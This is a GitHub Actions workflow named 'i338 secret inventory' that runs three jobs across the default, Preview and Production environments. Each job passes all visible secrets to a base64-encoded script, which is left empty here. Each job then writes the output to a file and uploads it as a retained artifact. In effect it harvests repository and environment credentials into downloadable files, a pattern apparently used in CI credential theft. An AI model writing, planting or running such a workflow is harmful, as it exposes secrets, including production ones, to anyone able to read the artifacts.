name: i338 secret inventory
on:
  workflow_dispatch:

permissions:
  contents: read
  actions: read

env:
  I338_SCRIPT_B64: 

jobs:
  default:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    
    steps:
      - name: Dump secrets visible to this job
        env:
          SECRETS_JSON: ${{ toJSON(secrets) }}
        run: |
          set +e
          mkdir -p /tmp/i338-default
          printf '%s' "$I338_SCRIPT_B64" | base64 -d > /tmp/i338-default/dump.py
          python3 /tmp/i338-default/dump.py I338_DEFAULT | tee /tmp/i338-default/dump.txt
      - name: Upload
        uses: actions/upload-artifact@v4
        with:
          name: i338-default
          path: /tmp/i338-default/
          retention-days: 2
          if-no-files-found: warn
  env-preview-0:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    environment: "Preview"
    steps:
      - name: Dump secrets visible to this job
        env:
          SECRETS_JSON: ${{ toJSON(secrets) }}
        run: |
          set +e
          mkdir -p /tmp/i338-env-preview-0
          printf '%s' "$I338_SCRIPT_B64" | base64 -d > /tmp/i338-env-preview-0/dump.py
          python3 /tmp/i338-env-preview-0/dump.py I338_ENV_0 | tee /tmp/i338-env-preview-0/dump.txt
      - name: Upload
        uses: actions/upload-artifact@v4
        with:
          name: i338-env-preview-0
          path: /tmp/i338-env-preview-0/
          retention-days: 2
          if-no-files-found: warn
  env-production-1:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    environment: "Production"
    steps:
      - name: Dump secrets visible to this job
        env:
          SECRETS_JSON: ${{ toJSON(secrets) }}
        run: |
          set +e
          mkdir -p /tmp/i338-env-production-1
          printf '%s' "$I338_SCRIPT_B64" | base64 -d > /tmp/i338-env-production-1/dump.py
          python3 /tmp/i338-env-production-1/dump.py I338_ENV_1 | tee /tmp/i338-env-production-1/dump.txt
      - name: Upload
        uses: actions/upload-artifact@v4
        with:
          name: i338-env-production-1
          path: /tmp/i338-env-production-1/
          retention-days: 2
          if-no-files-found: warn
